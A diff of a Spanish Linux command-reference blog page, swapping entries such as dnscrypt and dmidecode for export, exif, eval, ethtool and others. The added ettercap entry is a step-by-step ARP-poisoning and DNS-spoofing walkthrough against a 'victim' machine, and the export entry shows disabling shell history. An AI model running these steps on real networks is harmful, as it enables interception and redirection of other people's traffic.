@@ -9,8 +9,7 @@
   <meta name="author" content="templix">
 
   
-  <meta name="description" content="Muestra el nombre del dominio DNS del sistema. $ dnsdomainname
-">
+  <meta name="description" content="Exporta, almacena y lista variables. Para que los cambios sean permanentes, colocar la linea en .bashrc. # export PATH=${PATH}:/usr/local/bin ( &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -82,7 +81,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dnsdomainname/">Dnsdomainname</a></h1>
+      <h1 class="entry-title"><a href="/blog/export/">Export</a></h1>
     
     
       <p class="meta">
@@ -98,16 +97,40 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Muestra el nombre del dominio DNS del sistema.</p>
+  <div class="entry-content"><p>Exporta, almacena y lista variables. Para que los cambios sean permanentes, colocar la linea en .bashrc.</p>
 
-<blockquote><p>$ dnsdomainname</p></blockquote>
+<blockquote><p># export PATH=${PATH}:/usr/local/bin   (incluir un dir en el path)</p>
+
+<p>$ export TMOUT=60 (Establece 60 segundos de inactividad antes de cerrar una sesión ssh)</p>
+
+<p>$ export HISTCONTROL=”ignoreboth:erasedups” (no escribir en el history ni los comandos que empiecen por espacio, ni los duplicados y que además los elimine, dejando siempre el último)</p></blockquote>
+
+<p>Opciones para HISTCONTROL:</p>
+
+<p>ignorespace: No guarda en history los comandos que empiecen por espacio.</p>
+
+<p>ignoredups: No guarda los comandos repetidos.</p>
+
+<p>ignoreboth: Alias para los dos parámetros anteriores.</p>
+
+<p>erasedups: Elimina los comandos duplicados dejando el último ejecutado.</p>
+
+<blockquote><p>$ export HISTFILE=/home/usuario/histfile.txt (redirigir los comandos ejecutados durante una sesión a un archivo)</p>
+
+<p>$ export HISTFILE=/dev/null (Para no guardar el history de la sesión)</p>
+
+<p>$ export HISTFILE=/dev/null bash (abrir otra sesión que no almacene los comandos sin perder los de la actual)</p>
+
+<p>$ export PS1=&#8221;[\u@<code>curl icanhazip.com</code> \W]$ &#8221;  (Excentricidad: que el promt diga la ip externa.)</p>
+
+<p>$ export LANG=C; gedit (Lanzar una aplicación con un locale concreto)</p></blockquote>
 </div>
   
   
@@ -120,7 +143,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dnscrypt/">Dnscrypt</a></h1>
+      <h1 class="entry-title"><a href="/blog/expiry/">Expiry</a></h1>
     
     
       <p class="meta">
@@ -136,42 +159,16 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Cifrar el tráfico DNS.</p>
+  <div class="entry-content"><p>Chequea cuando caducan las contraseñas de usuario [si son temporales]</p>
 
-<blockquote><p>$ wget https://github.com/downloads/opendns/dnscrypt-proxy/dnscrypt-proxy-1.2.0.tar.gz</p>
-
-<p>$ tar xvvf dnscrypt-proxy-1.2.0.tar.gz</p>
-
-<p>$ cd dnscrypt-proxy-1.2.0/</p>
-
-<p>$ ./configure</p>
-
-<p>$ make</p>
-
-<p># make install</p>
-
-<p># dnscrypt-proxy &#8211;daemonize (Arrancar el demonio)</p></blockquote>
-
-<p>Modificar las DNSs en:</p>
-
-<blockquote><p># nano /etc/resolv.conf</p></blockquote>
-
-<p>Colocar:</p>
-
-<p>nameserver 127.0.0.1</p>
-
-<p>Nota.- Comentar las existentes.</p>
-
-<p>Para evitar que network-manager sobreescriba el archivo resolv.conf, bloquear el fichero:</p>
-
-<blockquote><p># chattr +i /etc/resolv.conf (Para desbloquearlo -i)</p></blockquote>
+<blockquote><p>$ expiry -c</p></blockquote>
 </div>
   
   
@@ -184,7 +181,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dmrc/">Dmrc</a></h1>
+      <h1 class="entry-title"><a href="/blog/expand/">Expand</a></h1>
     
     
       <p class="meta">
@@ -200,22 +197,18 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>En algunas ocasiones al iniciar ubuntu aparece la siguiente nota:</p>
+  <div class="entry-content"><p>Convierte los tabuladores a espacios. Elimina las tabulaciones y los remplaza por espacios en blanco. Por defecto las tabulaciones son de 8 espacios en blanco.</p>
 
-<p>su archivo $HOME/.dmrc no tiene los permisos adecuados y sera ignorado. Esto causara que la sesion e idioma predeterminado no se guarden. El archivo deberia pertener al usuario y tener los permisos 644</p>
+<blockquote><p>$ expand -t 5 texto.txt (Convierte las tabulaciones en 5 espacios en blanco)</p>
 
-<p>Para solucionarlo:</p>
-
-<blockquote><p># chmod 700 /home/usuario</p>
-
-<p># chmod 644 /home/usuario/.dmrc</p></blockquote>
+<p>$ expand -i -t 5 texto.txt (Sólo afecta a las tabulaciones de principio de linea)</p></blockquote>
 </div>
   
   
@@ -228,7 +221,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dmidecode/">Dmidecode</a></h1>
+      <h1 class="entry-title"><a href="/blog/exit/">Exit</a></h1>
     
     
       <p class="meta">
@@ -244,36 +237,14 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Muestra toda la información de la máquina directamente de la BIOS</p>
-
-<blockquote><p># dmidecode -t (muestra los elementos sobre los que se puede solicitar)</p>
-
-<p># dmidecode -s (Muestra el listado para afinar más la busqueda de datos)</p>
-
-<p># dmidecode -t memory | grep Size (muestra la memoria y los slots libres)</p>
-
-<p># dmidecode -t processor | grep &#8220;Core Count&#8221;  (número de “cores” reales)</p>
-
-<p># dmidecode | grep &#8220;Current Speed&#8221;  (muestra la frecuencia de la RAM)</p>
-
-<p># dmidecode -t 0  (información sobre la BIOS)</p>
-
-<p># dmidecode -t 1  (informacion del fabricante: núm serie, producto&#8230;)</p>
-
-<p># dmidecode -t 2 (información sobre la placa base)</p>
-
-<p># dmidecode -t 4  (información sobre la CPU)</p>
-
-<p># dmidecode &#8211;type=processor | grep -i -A 1 charac (si el procesador es de 32 o 64 bit)</p>
-
-<p># dmidecode -t memory | grep Maxi | grep Capa (máximo  de memoria soportada)</p></blockquote>
+  <div class="entry-content"><p>Salir del interprete de comandos.</p>
 </div>
   
   
@@ -286,7 +257,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/dmesg/">Dmesg</a></h1>
+      <h1 class="entry-title"><a href="/blog/exiftool/">Exiftool</a></h1>
     
     
       <p class="meta">
@@ -302,20 +273,28 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Imprimir en pantalla los mensajes del kernel</p>
+  <div class="entry-content"><p>Lee y extrae metadatos de imágenes</p>
 
-<blockquote><p>$ dmesg | grep -i &#8216;error&#8217;   (lista los errores del kernel)</p>
+<blockquote><p>$ exiftool -a -u -g1 foto.png</p>
 
-<p>$ dmesg | grep hd           (inf sobre dispositivos IDE.)</p>
+<p>$ exiftool -GPSAltitude=&#8221;0/1&#8221; foto.jpg  (Añadir tags a una imagen)</p>
 
-<p>$ dmesg -c  (Limpiar el registro)</p></blockquote>
+<p>$ exiftool -GPSLatitude=&#8221;41.403339&#8221; foto.jpg</p>
+
+<p>$ exiftool -GPSLatitudeRef=&#8221;N&#8221; foto.jpg</p>
+
+<p>$ exiftool -GPSLongitude=&#8221;2.1740288&#8221; foto.jpg</p>
+
+<p>$ exiftool -GPSLongitudeRef=&#8221;E&#8221; foto.jpg</p>
+
+<p>$ exiftool -TagsFromFile imagen_datos.jpg imagenFinal.jpg (Copia los datos Exif de la foto &#8220;imagen_datos.jpg&#8221; a la foto &#8220;imagenFinal.jpg&#8221;)</p></blockquote>
 </div>
   
   
@@ -328,7 +307,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/djvusmooth/">Djvusmooth</a></h1>
+      <h1 class="entry-title"><a href="/blog/exif/">Exif</a></h1>
     
     
       <p class="meta">
@@ -344,16 +323,20 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Visor y manipulador gráfico de documentos djvu.</p>
+  <div class="entry-content"><p>Extraer metadatos de imagenes</p>
 
-<blockquote><p>$ djvusmooth archivo.djvu</p></blockquote>
+<blockquote><p>$ exif -d imagen  (mostrar todos los datos)</p>
+
+<p>$ exif -e imagen  (extraer la foto miniatura)</p>
+
+<p>$ exif -r imagen   (suprimir la foto miniatura)</p></blockquote>
 </div>
   
   
@@ -366,7 +349,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/djvudump/">Djvudump</a></h1>
+      <h1 class="entry-title"><a href="/blog/exec/">Exec</a></h1>
     
     
       <p class="meta">
@@ -382,16 +365,16 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Mostrar la estructura interna de los archivos DjVu.</p>
+  <div class="entry-content"><p>Ejecuta comandos.</p>
 
-<blockquote><p>$ djvudump archivo.djvu</p></blockquote>
+<blockquote><p>$ exec firefox</p></blockquote>
 </div>
   
   
@@ -404,7 +387,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/djvm/">Djvm</a></h1>
+      <h1 class="entry-title"><a href="/blog/eval/">Eval</a></h1>
     
     
       <p class="meta">
@@ -420,20 +403,77 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Manipular documentos .djvu</p>
+  <div class="entry-content"><p>Toma los argumentos de la línea de comandos y los ejecuta como comandos.</p>
 
-<blockquote><p>$ djvm -l fichero.djvm (Lista el contenido)</p>
+<ul>
+<li>Tenemos un texto con variables:</li>
+</ul>
 
-<p>$ djvm -c archivo.djvu file1.djvu file2.djvu (Crea un archivo juntando varios archivos djvu)</p>
 
-<p>$ djvm -d archivo.djvu 0022 (Eliminar la página 22 del archivo.djvu)</p></blockquote>
+<blockquote><p>$ nano entrada_web.txt</p></blockquote>
+
+<pre><code>Hola $NOMBRE, felices de verte por la web $BLOG
+</code></pre>
+
+<p>Y un script con el siguiente contenido:</p>
+
+<pre><code>#!/bin/bash
+
+echo "¿Como te llamas? " 
+
+read NOMBRE
+
+BLOG="lapipaplena.net"
+
+eval "echo "$(cat ./entrada_web.txt)""
+</code></pre>
+
+<ul>
+<li>Substituiendo las variables del script en el texto.</li>
+</ul>
+
+
+<p>Otro ejemplo de uso de eval:</p>
+
+<blockquote><p>$ nano ejemplo.sh</p></blockquote>
+
+<pre><code>#!/bin/bash
+
+pipe="/ |"
+
+#ls $pipe wc -l
+
+eval ls $pipe wc -l
+</code></pre>
+
+<p>Descomentar la linea del &#8220;ls&#8221; y comentar la de &#8220;eval&#8221; y observar la diferencia entre ambas salidas.</p>
+
+<ul>
+<li>Otro ejemplo:</li>
+</ul>
+
+
+<blockquote><p>$ nano ejemplo.sh</p></blockquote>
+
+<pre><code>#!/bin/bash
+
+X=10
+
+Y=X
+
+#echo '$'$Y
+
+eval echo '$'$Y
+</code></pre>
+
+<p>Descomentar la linea del &#8220;echo&#8221; y comentar la de &#8220;eval&#8221; y observar la diferencia entre ambas salidas.</p>
 </div>
   
   
@@ -446,7 +486,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/display/">Display</a></h1>
+      <h1 class="entry-title"><a href="/blog/ettercap/">Ettercap</a></h1>
     
     
       <p class="meta">
@@ -462,20 +502,142 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>visualizar imagenes en las X</p>
+  <div class="entry-content"><p>[Dependencias: libcap2 libnet1 zlib1g libpthread-stubs0 libpcre3-dev libpcap-dev libcap-dev libnet6-1.3-0 libnet1-dev libssl-dev ncurses-bin libncurses5-dev libsdl-pango1 libatk1.0-dev]</p>
 
-<blockquote><p>$ display imagen.jpg</p>
+<p>Snifador de red. Muestra pantallas solicitando aceptación de certificado en los navegadores de las victimas.</p>
 
-<p>$ DISPLAY=:0.0 gedit  (lanzado desde una tty, abre gedit en las X. Si solo tenemos una sesión X corriendo, puede suprimirse el “.0”)</p>
+<p>descargar de http://ettercap.sourceforge.net/ y descomprimir</p>
 
-<p>$ gmessage “Cierra el firefox” -display :0 (Lanzado desde una tty mostrará el mensaje en las X)</p></blockquote>
+<blockquote><p>$ wget http://prdownloads.sourceforge.net/ettercap/ettercap-NG-0.7.3.tar.gz?download</p>
+
+<p>$ wget http://sourceforge.net/projects/ettercap/files/ettercap/NG-0.7.3/ettercap-NG-0.7.3.tar.gz/download</p>
+
+<p>$ tar -zvxf paquete</p>
+
+<p>$ cd ettercap-NG-0.7.3</p></blockquote>
+
+<pre><code>$ ./configure 
+
+$ make 
+
+# make install 
+</code></pre>
+
+<blockquote><p>$ ettercap -P list   (visualizar plugins instalados)</p></blockquote>
+
+<p>modificar archivo de configuración:</p>
+
+<blockquote><p># nano /etc/etter.conf</p></blockquote>
+
+<p>descomentar la linea:himne20-01-13 19:37Menos información</p>
+
+<blockquote><p># if you use iptables:</p></blockquote>
+
+<p>redir_command_on = &#8220;iptables -t nat -A PREROUTING -i %iface -p tcp &#8211;dport %port -j REDIRECT &#8211;to-port %rport&#8221;</p>
+
+<p>Y modificar:</p>
+
+<blockquote><p># the command used by the remote_browser plugin</p></blockquote>
+
+<p>remote_browser = &#8220;firefox -remote openurl(http://%host%url)&#8221;</p>
+
+<p>Para usar el plugin dns_spoof (Redireccionar páginas a otros sitios)</p>
+
+<blockquote><p># nano /usr/share/ettercap/etter.dns</p>
+
+<p># 3  Modos de especificar la redirección a localhost</p></blockquote>
+
+<pre><code>microsoft.com          A       192.168.1.2 
+
+*.microsoft.com        A       192.168.1.2 
+
+*google*               A       192.168.1.2
+</code></pre>
+
+<p>Para la sustitución de imagenes:</p>
+
+<blockquote><p># touch test2filter</p></blockquote>
+
+<p>Pegar:</p>
+
+<pre><code>if (ip.proto == TCP &amp;&amp; tcp.src == 80) { 
+
+replace("img src=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
+
+replace("IMG SRC=", "img src=\"http://www.irongeek.com/images/jollypwn.png\" "); 
+
+msg("Filter ok.\n");
+</code></pre>
+
+<p>Configurar el sistema para que acepte todos los paquetes que detecte. Si al lanzar:</p>
+
+<blockquote><p># cat /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Si la respuesta no es 1, lanzar:</p>
+
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
+
+<p>Arrancar la aplicación en ncurses [en terminal -> ettercap -T , en modo gtk -> ettercap -G y en modo demonio -> ettercap -D . En este último caso el análisis se realiza en los archivos de log]:</p>
+
+<blockquote><p># ettercap -C</p></blockquote>
+
+<p>Clicar en:</p>
+
+<pre><code>Sniff -&gt; Unifield sniffing 
+</code></pre>
+
+<p>Y aceptar [o poner] la red [eth0]. En la nueva pantalla, clic en:</p>
+
+<pre><code>Host -&gt; Scan for host 
+</code></pre>
+
+<p>Para escanear la red. Para visionar las máquina activas obtenidas, clic en:</p>
+
+<pre><code>Hosts -&gt; Hosts List 
+</code></pre>
+
+<p>Bajar con el cursor hasta la IP del router y pulsar la tecla &#8220;1&#8221;. Luego nos situamos sobre la IP del objetivo y pulsar la tecla &#8220;2&#8221; con lo que colocamos nuestra máquina entre el router y la máquina objetivo (envenenamiento arp). Luego en el cuadro que se abre con:</p>
+
+<pre><code>Mitm -&gt; Arp poisoning 
+</code></pre>
+
+<p>Parameters, ponemos:</p>
+
+<pre><code>remote
+</code></pre>
+
+<p>Y arrancamos el sniffer:</p>
+
+<pre><code>Start -&gt; Start sniffing 
+
+Para observar las conexiones que realiza la máquina objetivo: 
+
+View -&gt; Connections 
+
+Para terminar el ataque: 
+
+Mitm -&gt; Stop mitm atack 
+
+Start -&gt; Stop Sniffing 
+
+Start -&gt; Exit
+</code></pre>
+
+<p>Forma abreviada:</p>
+
+<pre><code># ettercap -Tq -M arp:remote -i eth0 ip_victima ip_router 
+
+O solo especificando la del router si se ataca toda la red: 
+</code></pre>
+
+<blockquote><p># ettercap -Tq -M arp:remote -i eth0 ip_router</p></blockquote>
 </div>
   
   
@@ -488,7 +650,7 @@
       
   <header>
     
-      <h1 class="entry-title"><a href="/blog/disown/">Disown</a></h1>
+      <h1 class="entry-title"><a href="/blog/ethtool/">Ethtool</a></h1>
     
     
       <p class="meta">
@@ -504,62 +666,24 @@
   
 
 
-<time datetime="2013-07-13T16:49:00+02:00" pubdate data-updated="true">13-07-2013</time>
+<time datetime="2013-10-27T13:52:00+01:00" pubdate data-updated="true">27-10-2013</time>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>Disociar un proceso de la terminal que lo lanzó. Cuando creamos un proceso desde una terminal, éste queda ligado a la terminal. Si se cierra la terminal, también se cierra el proceso. disown evita tal contingencia. Veamos el proceso:</p>
+  <div class="entry-content"><p>Averiguar/modificar la tarjeta de red</p>
 
-<p>Si se lanza:</p>
+<blockquote><p># ethtool eth0  (Para ver la configuración actual de la tarjeta)</p>
 
-<blockquote><p>$ yes > /dev/null</p></blockquote>
+<p># ethtool -i eth0  (conocer el driver de la tarjeta de red)</p>
 
-<p>Cerramos y volvemos a abrir la terminal y ejecutamos:</p>
+<p># ethtool &#8211;test eth0 (Realizar un test de la tarjeta si está soportado)</p>
 
-<blockquote><p>$ ps aux | grep yes | grep -v grep</p></blockquote>
+<p># ethtool -S eth0 (Consultar estadísticas de la red)</p>
 
-<p>Veremos que el proceso no existe. Si volvemos a lanzar &#8220;yes&#8221;:</p>
-
-<blockquote><p>$ yes > /dev/null</p></blockquote>
-
-<p>Pulsamos Ctrl+z:</p>
-
-<p>[1]+  Detenido                  yes > /dev/null</p>
-
-<p>Lanzando:</p>
-
-<blockquote><p>$ jobs</p></blockquote>
-
-<p>Nos mostrará la misma salida. Ahora en el promt escribimos:</p>
-
-<blockquote><p>$ disown -h %1</p></blockquote>
-
-<p>Con lo que desligamos el proceso de la terminal. Hemos liberado la terminal pero si la cerramos, aún matamos el proceso &#8220;yes&#8221;. Para que esto no ocurra, lo mandamos a segundo plano con bg y número de proceso [1]:</p>
-
-<blockquote><p>$ bg 1</p></blockquote>
-
-<p>[1]+ yes > /dev/null &amp;</p>
-
-<p>Ahora podemos cerrar la terminal sin que el proceso &#8220;yes&#8221; se vea afectado. El proceso se simplifica si ya lanzamos el comando en background:</p>
-
-<blockquote><p>$ yes > /dev/null &amp;</p></blockquote>
-
-<p>[1] 13248</p>
-
-<p>Lo disociamos de la terminal:</p>
-
-<blockquote><p>$ disown -h %1</p></blockquote>
-
-<p>Y ya podemos cerrar la terminal sin afectar al proceso.</p>
-
-<p>Otras opciones:</p>
-
-<blockquote><p>$ disown -a (Desliga todos los procesos ejecutados desde la terminal)</p>
-
-<p>$ disown -r (Desliga los que esten en marcha [running])</p></blockquote>
+<p># ethtool -p eth0 10 (Hacer parpadear los lets de la interfaz de red)</p></blockquote>
 </div>
   
   
@@ -582,7 +706,7 @@
     <section>
 <h1>Número de entradas</h1>
 	<ul>
-	<li>1213</li>
+	<li>1290</li>
 	</ul>
 </section>
 <section>
@@ -590,43 +714,43 @@
   <ul id="recent_posts">
     
       <li class="post">
-        <a href="/blog/owncloud/">owncloud</a>
+        <a href="/blog/zypper/">zypper</a>
       </li>
     
       <li class="post">
-        <a href="/blog/golismero/">golismero</a>
+        <a href="/blog/zmore/">zmore</a>
       </li>
     
       <li class="post">
-        <a href="/blog/curl/">curl</a>
+        <a href="/blog/zless/">zless</a>
       </li>
     
       <li class="post">
-        <a href="/blog/lorem/">lorem</a>
+        <a href="/blog/zip/">zip</a>
       </li>
     
       <li class="post">
-        <a href="/blog/kernel/">kernel</a>
+        <a href="/blog/zgrep/">zgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/yacy/">yacy</a>
+        <a href="/blog/zfgrep/">zfgrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/virtualbox/">virtualbox</a>
+        <a href="/blog/zenity/">zenity</a>
       </li>
     
       <li class="post">
-        <a href="/blog/miniflux/">miniflux</a>
+        <a href="/blog/zegrep/">zegrep</a>
       </li>
     
       <li class="post">
-        <a href="/blog/expresiones-regulares/">expresiones-regulares</a>
+        <a href="/blog/zdump/">zdump</a>
       </li>
     
       <li class="post">
-        <a href="/blog/sed/">sed</a>
+        <a href="/blog/zdiff/">zdiff</a>
       </li>
     
   </ul>
